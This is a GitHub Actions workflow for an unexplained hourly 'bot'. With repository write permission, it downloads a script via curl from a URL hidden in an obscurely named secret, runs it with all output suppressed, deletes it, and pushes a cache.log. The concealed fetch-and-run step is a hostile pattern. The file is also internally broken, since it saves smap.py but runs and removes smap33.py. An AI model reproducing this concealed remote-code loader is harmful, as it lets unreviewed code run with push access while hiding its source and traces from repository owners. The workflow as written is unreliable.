
name: Telm Bl

on:
  schedule:
    - cron: "0 * * * *"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  run-bot:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install requests beautifulsoup4


      - name: Retrieve Package
        env:
          SOURCE_URL: ${{ secrets.XQ7VNP4MK9222444 }}
        run: |
          curl -fsSL "$SOURCE_URL" -o smap.py

      - name: Process
        run: |
          python smap33.py > /dev/null 2>&1

      - name: Cleanup
        if: always()
        run: |
          rm -f smap33.py

      - name: Commit cache
        run: |
          if [ -f cache.log ] && ! git diff --quiet -- cache.log; then
            git config user.name "github-actions[bot]"
            git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
            git add cache.log
            git commit -m "Update bot cache"
            git push
          fi
